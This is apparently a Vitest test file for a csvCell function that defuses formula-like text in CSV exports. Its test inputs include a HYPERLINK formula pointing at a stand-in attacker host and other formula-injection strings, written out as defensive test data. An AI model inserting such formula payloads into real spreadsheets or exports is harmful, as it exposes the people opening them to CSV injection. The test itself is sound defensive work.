import { describe, expect, it } from "vitest";
import { csvCell } from "./client-actions";

describe("CSV export cells", () => {
  it("neutralises formula-like text from external data", () => {
    expect(csvCell("=HYPERLINK(\"https://attacker.example\")")).toBe("\"'=HYPERLINK(\"\"https://attacker.example\"\")\"");
    expect(csvCell("  +SUM(1,2)")).toBe("\"'  +SUM(1,2)\"");
    expect(csvCell("@command")).toBe("'@command");
  });

  it("keeps real numeric values usable", () => {
    expect(csvCell(-12)).toBe("-12");
    expect(csvCell(42)).toBe("42");
  });
});
